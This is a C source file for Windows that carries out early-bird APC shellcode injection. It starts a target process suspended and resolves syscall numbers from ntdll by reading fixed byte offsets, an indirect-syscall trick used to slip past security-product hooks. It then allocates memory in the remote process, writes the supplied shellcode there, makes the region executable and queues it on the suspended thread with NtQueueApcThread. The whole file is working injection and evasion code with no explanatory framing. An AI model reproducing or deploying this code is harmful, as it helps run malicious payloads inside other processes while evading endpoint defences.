#include "APC.h"

#pragma warning (disable:4996)


BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread,
	OUT PDWORD PID
)
{

	BOOL State = TRUE;
	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		WARN("CreateProcessA: %ld", GetLastError());
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*PID = ProcessInfo.dwProcessId;
	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}

VOID IDSC
(
	IN HMODULE ntdll,
	IN LPCSTR NtApi,
	OUT DWORD* FuncSSN,
	OUT PUINT_PTR FuncSyscall
)
{

	if (!FuncSSN || !FuncSyscall)
		return;

	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
	if (!NtFunction)
	{
		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
		return;
	}


	*FuncSyscall = NtFunction + 0x12;
	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];

	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);

}


BOOL ApcInject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN BYTE* pShellcode,
	IN SIZE_T sShellSize
)

{

	NTSTATUS STATUS = NULL;
	BOOL State = TRUE;
	PVOID rBuffer = NULL;
	HANDLE NtdllHandle = NULL;
	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProt = NULL;
	PUCHAR localBuf = NULL;
	SIZE_T origSize = sShellSize;
	SIZE_T regionSize = sShellSize;


	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sShellSize);
	if (!localBuf) {
		WARN("HeapAlloc failed");
		return FALSE;
	}
	memcpy(localBuf, pShellcode, sShellSize);


	NtdllHandle = GetModuleHandleW(L"ntdll.dll");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);

	IDSC(NtdllHandle, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtQueueApcThread", &fn_NtQueueApcThreadSSN, &fn_NtQueueApcThreadSyscall);
	IDSC(NtdllHandle, "NtFreeVirtualMemory", &fn_NtFreeVirtualMemorySSN, &fn_NtFreeVirtualMemorySyscall);


	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Allocated [%zu] Bytes to Virtual Memory!", sShellSize);

	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}


	OKAY("Wrote [%zu] Bytes to Virtual Memory", sShellSize);

	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/

	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Changed Allocation Protection from [RW] to [RX]");

	STATUS = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQueueApcThread Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	OKAY("[ 0x%p ] Executed payload using NtQueueApcThread", rBuffer);

	return TRUE;

}
